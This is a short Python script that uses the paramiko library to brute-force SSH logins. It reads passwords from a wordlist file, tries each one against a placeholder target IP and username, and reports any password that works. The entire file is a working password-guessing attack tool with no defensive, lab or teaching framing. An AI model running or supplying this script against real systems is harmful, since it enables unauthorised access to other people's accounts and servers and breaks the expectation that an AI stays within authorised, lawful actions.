import paramiko
import socket
import sys 
import time

# declaring target_ip
target_ip = '[TARGET_IP]'
username = '[USERNAME]'
password_file = 'passwords.txt'
timeout = 5

# ssh_brute_force function 
def ssh_brute_force():
    print(f"Starting SSH brute-force on {target_ip}...")
    try:
        with open(password_file, 'r') as myfile:
            passwords = myfile.read().splitlines()
    except FileNotFoundError:
        print(f"[!] File '{password_file}' not found.")
        sys.exit(1)

    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=target_ip, username=username, password=password, timeout=timeout)
            print(f"[+] Success! Username: {username} | Password: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except (socket.error, paramiko.SSHException) as e:
            print(f"[!] Conncetion error: {str(e)}")
            time.sleep(2)
        finally:
            try: 
                ssh.close()
            except:
                pass
    print("[*] Finished. No valid password found.")

if __name__ == "__main__":
    ssh_brute_force()